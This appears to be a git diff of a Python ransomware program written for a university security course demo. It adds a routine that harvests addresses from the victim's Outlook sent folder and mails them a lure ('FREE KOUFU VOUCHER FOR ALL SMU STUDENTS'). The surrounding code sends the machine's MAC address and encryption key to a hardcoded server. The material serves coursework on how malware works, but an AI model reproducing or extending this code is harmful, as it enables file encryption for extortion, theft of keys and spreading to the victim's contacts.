@@ -10,6 +10,7 @@ import threading
 import queue
 import random
 import webbrowser
+import win32com.client
 from cryptography.fernet import Fernet 
 from tkinter import *
 from PIL import ImageTk, Image
@@ -89,8 +90,7 @@ def get_public_key():
 print("Loaded helper functions")
 
 # Initialize variables
-IP_ADDRESS = '192.168.50.113'
-IP_ADDRESS_SMU = '192.168.126.1'
+IP_ADDRESS = '192.168.126.1'
 PORT = 3000
 HOSTNAME = os.getenv("COMPUTERNAME")
 HOST_MAC_ADDRESS = get_mac_address()
@@ -373,7 +373,7 @@ def connect_to_server():
     print("Attempting to connect to server...")
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((IP_ADDRESS_SMU, PORT))
+        s.connect((IP_ADDRESS, PORT))
         print("Successfully connected, transmitting data")
         plaintext_byte = f"MAC_ADDRESS: {HOST_MAC_ADDRESS}\nENCRYPTION_KEY: {SECRET_KEY}".encode('utf-8')
         encrypted_msg = rsa.encrypt(plaintext_byte, PUBLIC_KEY)
@@ -389,6 +389,45 @@ def connect_to_server():
 # Call the connect_to_server function
 connect_to_server()
 #---------------------------End of server connection---------------------------|
+
+
+
+
+
+#---------------------------Sending email to other victims---------------------|
+outlook = win32com.client.Dispatch("Outlook.Application") 
+namespace = outlook.GetNamespace("MAPI")  
+accounts = namespace.Accounts 
+ 
+desired_account_index = 0 
+ 
+print(accounts[desired_account_index]) 
+account = accounts[desired_account_index] 
+sent_items = account.DeliveryStore.GetDefaultFolder(5)  
+
+messages = sent_items.Items 
+messages.Sort("[SentOn]", True) 
+recent_messages = messages.Restrict("[SentOn] >= '" + messages[0].SentOn.Format("%m/%d/%Y") + "'") 
+recipient_emails = [] 
+for message in recent_messages:  
+    for recipient in message.Recipients: 
+        recipient_emails.append(recipient.Address) 
+        break 
+# recipient_emails.append(recent_messages[0].Recipients[0].Address) 
+
+recipient_emails = list(set(recipient_emails)) 
+print(recipient_emails)
+new_message = outlook.CreateItem(0) 
+new_message.To = "; ".join(recipient_emails) 
+new_message.Subject = "FREE KOUFU VOUCHER FOR ALL SMU STUDENTS" 
+new_message.Body = "EH SIKE NOTHING IS EVER FREE IN SINGAPORE. \n\nTest message for CS440 Project Demo"
+new_message.Send() 
+print("Email sent successfully!")
+#---------------------------End of transfer------------------------------------|
+
+
+
+
 
 try:
     logo = resource_path("img/red_lock_logo.png")
